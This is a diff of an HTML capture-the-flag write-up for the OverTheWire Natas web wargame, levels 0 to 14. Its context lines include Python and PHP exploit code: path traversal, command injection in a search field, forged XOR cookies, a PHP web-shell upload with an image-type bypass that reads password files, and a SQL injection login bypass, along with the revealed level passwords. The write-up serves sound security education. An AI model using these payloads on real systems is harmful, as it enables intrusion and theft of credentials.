@@ -32,29 +32,29 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents">
 <ul>
-<li><a href="#orgc1c8cdf">Introduction</a></li>
-<li><a href="#org5880804">Level 0</a></li>
-<li><a href="#org2ea1ca1">Level 1</a></li>
-<li><a href="#orge7a8204">Level 2</a></li>
-<li><a href="#orged01b2f">Level 3</a></li>
-<li><a href="#org57b4600">Level 4</a></li>
-<li><a href="#org0eb1a89">Level 5</a></li>
-<li><a href="#org75beccf">Level 6</a></li>
-<li><a href="#org19f0d17">Level 7</a></li>
-<li><a href="#org211e6ea">Level 8</a></li>
-<li><a href="#org064f32b">Level 9</a></li>
-<li><a href="#org823d45b">Level 10</a></li>
-<li><a href="#org9e2bdc4">Level 11</a></li>
-<li><a href="#orgdb6f2d5">Level 12</a></li>
-<li><a href="#org2fdf9ec">Level 13</a></li>
-<li><a href="#orgb194f5d">Level 14</a></li>
+<li><a href="#orgbd16f73">Introduction</a></li>
+<li><a href="#org8dd7267">Level 0</a></li>
+<li><a href="#org16b1916">Level 1</a></li>
+<li><a href="#orgba81e20">Level 2</a></li>
+<li><a href="#orgca652f3">Level 3</a></li>
+<li><a href="#org2207aa9">Level 4</a></li>
+<li><a href="#org89605eb">Level 5</a></li>
+<li><a href="#org5c5a0ef">Level 6</a></li>
+<li><a href="#org2883544">Level 7</a></li>
+<li><a href="#org12f93d7">Level 8</a></li>
+<li><a href="#org25192b7">Level 9</a></li>
+<li><a href="#orgc1329b6">Level 10</a></li>
+<li><a href="#org01064cc">Level 11</a></li>
+<li><a href="#orge5664d6">Level 12</a></li>
+<li><a href="#orgc247a46">Level 13</a></li>
+<li><a href="#orgd0ba15f">Level 14</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-orgc1c8cdf" class="outline-2">
-<h2 id="orgc1c8cdf">Introduction</h2>
-<div class="outline-text-2" id="text-orgc1c8cdf">
+<div id="outline-container-orgbd16f73" class="outline-2">
+<h2 id="orgbd16f73">Introduction</h2>
+<div class="outline-text-2" id="text-orgbd16f73">
 <p>
 <span class="timestamp-wrapper"><span class="timestamp">[2023-02-24 Fri] </span></span> This is a writeup for the <a href="https://overthewire.org/wargames/">overthewire.org</a> war
 game Natas. To start a level visit the URL
@@ -71,15 +71,15 @@ found in the previous level.
 </div>
 </div>
 
-<div id="outline-container-org5880804" class="outline-2">
-<h2 id="org5880804">Level 0</h2>
-<div class="outline-text-2" id="text-org5880804">
+<div id="outline-container-org8dd7267" class="outline-2">
+<h2 id="org8dd7267">Level 0</h2>
+<div class="outline-text-2" id="text-org8dd7267">
 <p>
 View the source page and find the password:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org3ecdad0">curl -u natas0:natas0 <span class="org-string">"http://natas0.natas.labs.overthewire.org/"</span> | grep natas1
+<pre class="src src-sh" id="org0703415">curl -u natas0:natas0 <span class="org-string">"http://natas0.natas.labs.overthewire.org/"</span> | grep natas1
 </pre>
 </div>
 
@@ -89,15 +89,15 @@ View the source page and find the password:
 </div>
 </div>
 
-<div id="outline-container-org2ea1ca1" class="outline-2">
-<h2 id="org2ea1ca1">Level 1</h2>
-<div class="outline-text-2" id="text-org2ea1ca1">
+<div id="outline-container-org16b1916" class="outline-2">
+<h2 id="org16b1916">Level 1</h2>
+<div class="outline-text-2" id="text-org16b1916">
 <p>
 View the source page by using a short cut key (for me <code>Ctrl+u</code>):
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="orgd80bc6b">curl -u natas1:<span class="org-string">"${PASS_NATAS1}"</span> <span class="org-string">"http://natas1.natas.labs.overthewire.org/"</span> | grep natas2
+<pre class="src src-sh" id="org263d64a">curl -u natas1:<span class="org-string">"${PASS_NATAS1}"</span> <span class="org-string">"http://natas1.natas.labs.overthewire.org/"</span> | grep natas2
 </pre>
 </div>
 
@@ -107,9 +107,9 @@ View the source page by using a short cut key (for me <code>Ctrl+u</code>):
 </div>
 </div>
 
-<div id="outline-container-orge7a8204" class="outline-2">
-<h2 id="orge7a8204">Level 2</h2>
-<div class="outline-text-2" id="text-orge7a8204">
+<div id="outline-container-orgba81e20" class="outline-2">
+<h2 id="orgba81e20">Level 2</h2>
+<div class="outline-text-2" id="text-orgba81e20">
 <p>
 Again view the source page. There is a line with a link to an image
 </p>
@@ -130,7 +130,7 @@ next level.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="orgd1bc5cd">curl -u natas2:<span class="org-string">"${PASS_NATAS2}"</span> <span class="org-string">"http://natas2.natas.labs.overthewire.org/files/users.txt"</span> | grep natas3
+<pre class="src src-sh" id="orge310dc2">curl -u natas2:<span class="org-string">"${PASS_NATAS2}"</span> <span class="org-string">"http://natas2.natas.labs.overthewire.org/files/users.txt"</span> | grep natas3
 </pre>
 </div>
 
@@ -140,9 +140,9 @@ natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
 </div>
 </div>
 
-<div id="outline-container-orged01b2f" class="outline-2">
-<h2 id="orged01b2f">Level 3</h2>
-<div class="outline-text-2" id="text-orged01b2f">
+<div id="outline-container-orgca652f3" class="outline-2">
+<h2 id="orgca652f3">Level 3</h2>
+<div class="outline-text-2" id="text-orgca652f3">
 <p>
 View the source and find the line
 </p>
@@ -159,7 +159,7 @@ password for natas4.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org0301ef7">curl -u natas3:<span class="org-string">"${PASS_NATAS3}"</span> <span class="org-string">"http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"</span> | grep natas4
+<pre class="src src-sh" id="orgf832754">curl -u natas3:<span class="org-string">"${PASS_NATAS3}"</span> <span class="org-string">"http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"</span> | grep natas4
 </pre>
 </div>
 
@@ -169,9 +169,9 @@ natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
 </div>
 </div>
 
-<div id="outline-container-org57b4600" class="outline-2">
-<h2 id="org57b4600">Level 4</h2>
-<div class="outline-text-2" id="text-org57b4600">
+<div id="outline-container-org2207aa9" class="outline-2">
+<h2 id="org2207aa9">Level 4</h2>
+<div class="outline-text-2" id="text-org2207aa9">
 <p>
 NOTE: from level 4 and onwards the code snippets are written in
 <code>Python</code> unless otherwise specified.
@@ -199,14 +199,14 @@ levels:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="orgac31595"><span class="org-keyword">import</span> requests
+<pre class="src src-python" id="org026613b"><span class="org-keyword">import</span> requests
 <span class="org-keyword">from</span> requests.auth <span class="org-keyword">import</span> HTTPBasicAuth
 <span class="org-keyword">import</span> re
 </pre>
 </div>
 
 <div class="org-src-container">
-<pre class="src src-python" id="org1695a62"><span class="org-keyword">def</span> <span class="org-function-name">find_pswd</span>(text):
+<pre class="src src-python" id="orgac2b0cc"><span class="org-keyword">def</span> <span class="org-function-name">find_pswd</span>(text):
     <span class="org-doc">""" Find the line with the password in the html text. """</span>
     <span class="org-variable-name">lines</span> = text.split(<span class="org-string">'\n'</span>)
     <span class="org-variable-name">bools</span> = <span class="org-builtin">list</span>(<span class="org-builtin">map</span>(<span class="org-keyword">lambda</span> x : <span class="org-string">"password"</span> <span class="org-keyword">in</span> x, lines))
@@ -235,7 +235,7 @@ Now the code that changes the referer to natas5:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="org6040fc4"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(4)
+<pre class="src src-python" id="org1ccccac"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(4)
 <span class="org-variable-name">headers</span> = {<span class="org-string">'referer'</span>: <span class="org-string">'http://natas5.natas.labs.overthewire.org/'</span>}
 
 <span class="org-comment-delimiter"># </span><span class="org-comment">get request with the referer set to natas5</span>
@@ -251,9 +251,9 @@ Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
 </div>
 </div>
 
-<div id="outline-container-org0eb1a89" class="outline-2">
-<h2 id="org0eb1a89">Level 5</h2>
-<div class="outline-text-2" id="text-org0eb1a89">
+<div id="outline-container-org89605eb" class="outline-2">
+<h2 id="org89605eb">Level 5</h2>
+<div class="outline-text-2" id="text-org89605eb">
 <p>
 After logging in the web page shows:
 </p>
@@ -267,7 +267,7 @@ Lets inspect the headers to see what is happening
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="org3d86917"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(5)
+<pre class="src src-python" id="org3969318"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(5)
 
 <span class="org-variable-name">r</span> = requests.get(url, auth=HTTPBasicAuth(user, PASS_NATAS5))
 <span class="org-keyword">print</span>(r.headers)
@@ -285,7 +285,7 @@ changed to <code>loggedin=1</code> then that should give access to the password.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="org43fa58d"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(5)
+<pre class="src src-python" id="orga8bdd82"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(5)
 <span class="org-variable-name">cookies</span> = {<span class="org-string">'loggedin'</span>: <span class="org-string">'1'</span>}
 
 <span class="org-comment-delimiter"># </span><span class="org-comment">get request with the cookie set loggedin=1</span>
@@ -300,9 +300,9 @@ Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR&lt;/
 </div>
 </div>
 
-<div id="outline-container-org75beccf" class="outline-2">
-<h2 id="org75beccf">Level 6</h2>
-<div class="outline-text-2" id="text-org75beccf">
+<div id="outline-container-org5c5a0ef" class="outline-2">
+<h2 id="org5c5a0ef">Level 6</h2>
+<div class="outline-text-2" id="text-org5c5a0ef">
 <p>
 After logging in we are prompted to input a secret. The page source
 contains the line:
@@ -329,7 +329,7 @@ reveals the secret: <code>FOEIUWGHFEEUHOFUOIU</code>
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="orgf7ee37d"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(6)
+<pre class="src src-python" id="org3a78ab7"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(6)
 <span class="org-variable-name">post_data</span> = {<span class="org-string">"secret"</span>: <span class="org-string">"FOEIUWGHFEEUHOFUOIU"</span>, <span class="org-string">"submit"</span>: <span class="org-string">"submit"</span>}
 
 <span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS6), data=post_data)
@@ -344,9 +344,9 @@ Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
 </div>
 </div>
 
-<div id="outline-container-org19f0d17" class="outline-2">
-<h2 id="org19f0d17">Level 7</h2>
-<div class="outline-text-2" id="text-org19f0d17">
+<div id="outline-container-org2883544" class="outline-2">
+<h2 id="org2883544">Level 7</h2>
+<div class="outline-text-2" id="text-org2883544">
 <p>
 The source page says:
 </p>
@@ -365,7 +365,7 @@ i.e. <code>/index.php?page=/etc/natas_webpass/natas8</code>. This is know as a
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="orgdcfa3dd"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(7)
+<pre class="src src-python" id="orgd35db16"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(7)
 <span class="org-variable-name">pswd</span> = <span class="org-string">"7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"</span>
 <span class="org-variable-name">path</span> = <span class="org-string">"/index.php?page=/etc/natas_webpass/natas8"</span>
 
@@ -382,9 +382,9 @@ a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
 </div>
 </div>
 
-<div id="outline-container-org211e6ea" class="outline-2">
-<h2 id="org211e6ea">Level 8</h2>
-<div class="outline-text-2" id="text-org211e6ea">
+<div id="outline-container-org12f93d7" class="outline-2">
+<h2 id="org12f93d7">Level 8</h2>
+<div class="outline-text-2" id="text-org12f93d7">
 <p>
 The source page again has a link to:
 </p>
@@ -416,7 +416,7 @@ All we need to do is reverse this function on the given encoded secret:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="org0978315"><span class="org-keyword">from</span> base64 <span class="org-keyword">import</span> b64decode
+<pre class="src src-python" id="org194f15c"><span class="org-keyword">from</span> base64 <span class="org-keyword">import</span> b64decode
 
 <span class="org-variable-name">secret</span> = <span class="org-string">"3d3d516343746d4d6d6c315669563362"</span>
 
@@ -446,7 +446,7 @@ Now we can POST the <code>DECODED_SECRET:</code>
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="orga05d26b"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(8)
+<pre class="src src-python" id="orgb58e7e0"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(8)
 <span class="org-variable-name">post_data</span> = {<span class="org-string">"secret"</span>: DECODED_SECRET, <span class="org-string">"submit"</span>: <span class="org-string">"submit"</span>}
 
 <span class="org-comment-delimiter"># </span><span class="org-comment">get request with the referer set to natas5</span>
@@ -462,9 +462,9 @@ Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 </div>
 </div>
 
-<div id="outline-container-org064f32b" class="outline-2">
-<h2 id="org064f32b">Level 9</h2>
-<div class="outline-text-2" id="text-org064f32b">
+<div id="outline-container-org25192b7" class="outline-2">
+<h2 id="org25192b7">Level 9</h2>
+<div class="outline-text-2" id="text-org25192b7">
 <p>
 On the site there is a search box that searches for words. Trying out
 some words in the search box shows that it actual does find all words
@@ -488,7 +488,7 @@ for the next level.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="orgb84f4db"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(9)
+<pre class="src src-python" id="org9ece86e"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(9)
 <span class="org-variable-name">post_data</span> = {<span class="org-string">"needle"</span>: <span class="org-string">"'' /etc/natas_webpass/natas10"</span>, <span class="org-string">"submit"</span>: <span class="org-string">"submit"</span>}
 
 <span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS9), data=post_data)
@@ -504,9 +504,9 @@ D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
 </div>
 </div>
 
-<div id="outline-container-org823d45b" class="outline-2">
-<h2 id="org823d45b">Level 10</h2>
-<div class="outline-text-2" id="text-org823d45b">
+<div id="outline-container-orgc1329b6" class="outline-2">
+<h2 id="orgc1329b6">Level 10</h2>
+<div class="outline-text-2" id="text-orgc1329b6">
 <p>
 This level is similar to the previous level but it checks if there are
 "illegal" characters in the input.
@@ -529,7 +529,7 @@ it is possible to re-use the 'needle' from level 9.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="orgef15f14"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(10)
+<pre class="src src-python" id="org7fa806a"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(10)
 <span class="org-variable-name">post_data</span> = {<span class="org-string">"needle"</span>: <span class="org-string">"'' /etc/natas_webpass/natas11"</span>, <span class="org-string">"submit"</span>: <span class="org-string">"submit"</span>}
 
 <span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS10), data=post_data)
@@ -544,13 +544,13 @@ it is possible to re-use the 'needle' from level 9.
 </div>
 </div>
 
-<div id="outline-container-org9e2bdc4" class="outline-2">
-<h2 id="org9e2bdc4">Level 11</h2>
-<div class="outline-text-2" id="text-org9e2bdc4">
+<div id="outline-container-org01064cc" class="outline-2">
+<h2 id="org01064cc">Level 11</h2>
+<div class="outline-text-2" id="text-org01064cc">
 </div>
-<div id="outline-container-org5f65ea4" class="outline-3">
-<h3 id="org5f65ea4">Intro</h3>
-<div class="outline-text-3" id="text-org5f65ea4">
+<div id="outline-container-org7b75095" class="outline-3">
+<h3 id="org7b75095">Intro</h3>
+<div class="outline-text-3" id="text-org7b75095">
 <p>
 From the source code, these are the most important
 functions/variables:
@@ -590,15 +590,15 @@ the xor function) can be rewritten to solve for the key like
 </div>
 </div>
 
-<div id="outline-container-orgdebc416" class="outline-3">
-<h3 id="orgdebc416">Get the cookie (cipher text)</h3>
-<div class="outline-text-3" id="text-orgdebc416">
+<div id="outline-container-orge0652b0" class="outline-3">
+<h3 id="orge0652b0">Get the cookie (cipher text)</h3>
+<div class="outline-text-3" id="text-orge0652b0">
 <p>
 So lets get a cookie:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="org17c73ea"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(11)
+<pre class="src src-python" id="orge382296"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(11)
 <span class="org-variable-name">data</span> = {<span class="org-string">"bgcolor"</span>: <span class="org-string">"#000000"</span>, <span class="org-string">"submit"</span>: <span class="org-string">"Set color"</span>}
 
 <span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS11), data=data)
@@ -617,7 +617,7 @@ The <code>Set-Cookie</code> value is what we are looking for.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="org7d2c3d5"><span class="org-variable-name">cookie</span> = r.headers[<span class="org-string">'Set-Cookie'</span>][5:]
+<pre class="src src-python" id="org132283c"><span class="org-variable-name">cookie</span> = r.headers[<span class="org-string">'Set-Cookie'</span>][5:]
 <span class="org-keyword">print</span>(f<span class="org-string">'The cookie is: {cookie}'</span>)
 </pre>
 </div>
@@ -633,7 +633,7 @@ decode it:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="org7e0262c"><span class="org-keyword">from</span> urllib.parse <span class="org-keyword">import</span> unquote
+<pre class="src src-python" id="org311856c"><span class="org-keyword">from</span> urllib.parse <span class="org-keyword">import</span> unquote
 
 <span class="org-variable-name">url_decoded_cookie</span> = unquote(cookie)
 <span class="org-keyword">print</span>(f<span class="org-string">'The url decoded cookie is:\n{url_decoded_cookie}'</span>)
@@ -652,7 +652,7 @@ decode it.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="org7de542d"><span class="org-keyword">from</span> base64 <span class="org-keyword">import</span> b64decode
+<pre class="src src-python" id="org27c768c"><span class="org-keyword">from</span> base64 <span class="org-keyword">import</span> b64decode
 
 <span class="org-variable-name">base64_decoded_cookie</span> = b64decode(url_decoded_cookie).<span class="org-builtin">hex</span>()
 <span class="org-keyword">print</span>(f<span class="org-string">'The cookie/cipher text in hex is:\n{base64_decoded_cookie}'</span>)
@@ -666,16 +666,16 @@ The cookie/cipher text in hex is:
 </div>
 </div>
 
-<div id="outline-container-org027a387" class="outline-3">
-<h3 id="org027a387">Get the plain text</h3>
-<div class="outline-text-3" id="text-org027a387">
+<div id="outline-container-org87ee133" class="outline-3">
+<h3 id="org87ee133">Get the plain text</h3>
+<div class="outline-text-3" id="text-org87ee133">
 <p>
 Now to get the plaintext that is used in the <code>xor_encrypt()</code> json
 encode the <code>defaultdata</code> first.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-php" id="orgc059cd3">// this is php code:
+<pre class="src src-php" id="org133cd33">// this is php code:
 $defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");
 json_encode($defaultdata);
 echo (json_encode($defaultdata));
@@ -688,16 +688,16 @@ echo (json_encode($defaultdata));
 </div>
 </div>
 
-<div id="outline-container-org003ab0d" class="outline-3">
-<h3 id="org003ab0d">Find the encryption key</h3>
-<div class="outline-text-3" id="text-org003ab0d">
+<div id="outline-container-org052f0bf" class="outline-3">
+<h3 id="org052f0bf">Find the encryption key</h3>
+<div class="outline-text-3" id="text-org052f0bf">
 <p>
 Now use the plain and cipher text in a slightly rewritten
 <code>xor_encrypt()</code> to find the key.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-php" id="org292ac69">// this is php code:
+<pre class="src src-php" id="org5dc65eb">// this is php code:
 $defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");
 
 function xor_encrypt($in, $key) {
@@ -732,9 +732,9 @@ is the substring <code>qw8J</code>.
 </div>
 </div>
 
-<div id="outline-container-org9f1d951" class="outline-3">
-<h3 id="org9f1d951">Get the password for natas12</h3>
-<div class="outline-text-3" id="text-org9f1d951">
+<div id="outline-container-org691e3e8" class="outline-3">
+<h3 id="org691e3e8">Get the password for natas12</h3>
+<div class="outline-text-3" id="text-org691e3e8">
 <p>
 To get the password change the <code>showpassword</code> value from the array
 <code>$defaultdata</code> to "yes". Then encrypt the array with the key
@@ -743,7 +743,7 @@ cookie and will give the password.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-php" id="org12939a5">// this is php code:
+<pre class="src src-php" id="orgea91ecb">// this is php code:
 $defaultdata = array( "showpassword"=&gt;"yes", "bgcolor"=&gt;"#ffffff");
 
 function xor_encrypt($in, $key) {
@@ -777,7 +777,7 @@ with the cookie attached. This will show the password for Natas 12.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="orgb8a565d"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(11)
+<pre class="src src-python" id="org2abded3"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(11)
 <span class="org-variable-name">data</span> = {<span class="org-string">"bgcolor"</span>: <span class="org-string">"#000000"</span>, <span class="org-string">"submit"</span>: <span class="org-string">"Set color"</span>}
 <span class="org-variable-name">cookies</span> = {<span class="org-string">'data'</span>: <span class="org-string">'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'</span>}
 
@@ -795,9 +795,9 @@ EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 </div>
 </div>
 
-<div id="outline-container-orgdb6f2d5" class="outline-2">
-<h2 id="orgdb6f2d5">Level 12</h2>
-<div class="outline-text-2" id="text-orgdb6f2d5">
+<div id="outline-container-orge5664d6" class="outline-2">
+<h2 id="orge5664d6">Level 12</h2>
+<div class="outline-text-2" id="text-orge5664d6">
 <p>
 The webpage asks for .jpg files to be uploaded. After uploading a
 picture a link is given to the location, <code>upload/&lt;randomstring&gt;.jpg</code>,
@@ -823,7 +823,7 @@ the password for natas13.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="orgd6b8240"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(12)
+<pre class="src src-python" id="orgc3ae8b7"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(12)
 
 <span class="org-variable-name">evil</span> = {<span class="org-string">'uploadedfile'</span>: <span class="org-builtin">open</span>(<span class="org-string">'/home/br/Pictures/shots/evil.php'</span>, <span class="org-string">'rb'</span>)}
 
@@ -840,7 +840,7 @@ The path to our uploaded file: upload/tdxpbrtuna.php
 
 
 <div class="org-src-container">
-<pre class="src src-python" id="org1edca0d"><span class="org-variable-name">r1</span> = requests.get(url+path, auth=HTTPBasicAuth(user, PASS_NATAS12))
+<pre class="src src-python" id="orga7ffdea"><span class="org-variable-name">r1</span> = requests.get(url+path, auth=HTTPBasicAuth(user, PASS_NATAS12))
 <span class="org-comment-delimiter"># </span><span class="org-comment">The password for natas13:</span>
 <span class="org-keyword">print</span>(r1.text)
 </pre>
@@ -852,9 +852,9 @@ jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 </div>
 </div>
 
-<div id="outline-container-org2fdf9ec" class="outline-2">
-<h2 id="org2fdf9ec">Level 13</h2>
-<div class="outline-text-2" id="text-org2fdf9ec">
+<div id="outline-container-orgc247a46" class="outline-2">
+<h2 id="orgc247a46">Level 13</h2>
+<div class="outline-text-2" id="text-orgc247a46">
 <p>
 This level is similar to level 12 but it uses <code>exif_imagetype</code> to
 check if the file being uploaded is actually an image. It does this by
@@ -867,7 +867,7 @@ similar to level 12. The <i>magic number</i> is <code>\xFF\xD8\xFF\xE0</code>.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="org2a96685"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(13)
+<pre class="src src-python" id="orgacf5f8a"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(13)
 
 <span class="org-comment-delimiter"># </span><span class="org-comment">write the magic number and the to be executed php to evilFile</span>
 <span class="org-variable-name">evilFile</span> = <span class="org-string">'/home/br/Pictures/shots/evil3.php'</span>
@@ -891,7 +891,7 @@ The path to our uploaded file: upload/4ttajmtyw5.php
 
 
 <div class="org-src-container">
-<pre class="src src-python" id="org9a095c6"><span class="org-variable-name">r1</span> = requests.get(url+path+<span class="org-string">'?cmd=cat /etc/natas_webpass/natas14'</span>, auth=HTTPBasicAuth(user, PASS_NATAS13))
+<pre class="src src-python" id="org7bc3591"><span class="org-variable-name">r1</span> = requests.get(url+path+<span class="org-string">'?cmd=cat /etc/natas_webpass/natas14'</span>, auth=HTTPBasicAuth(user, PASS_NATAS13))
 <span class="org-comment-delimiter"># </span><span class="org-comment">The password for natas13</span>
 <span class="org-keyword">print</span>(r1.text[4:])
 </pre>
@@ -903,9 +903,9 @@ Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 </div>
 </div>
 
-<div id="outline-container-orgb194f5d" class="outline-2">
-<h2 id="orgb194f5d">Level 14</h2>
-<div class="outline-text-2" id="text-orgb194f5d">
+<div id="outline-container-orgd0ba15f" class="outline-2">
+<h2 id="orgd0ba15f">Level 14</h2>
+<div class="outline-text-2" id="text-orgd0ba15f">
 <p>
 This level has a login form. The source code reveals the use of very
 simple sql queries, which means we could try some <a href="https://en.wikipedia.org/wiki/SQL_injection#Incorrectly_constructed_SQL_statements">sql injections</a>. The
@@ -914,7 +914,7 @@ the username and the password.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python" id="orgd66035f"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(14)
+<pre class="src src-python" id="org793df40"><span class="org-variable-name">user</span>, <span class="org-variable-name">url</span> = user_url(14)
 <span class="org-variable-name">data</span> = {<span class="org-string">'username'</span>: <span class="org-string">'" or 1=1 --'</span>, <span class="org-string">'password'</span>: <span class="org-string">'" or 1=1 --'</span>}
 
 <span class="org-variable-name">r</span> = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS14), data=data)
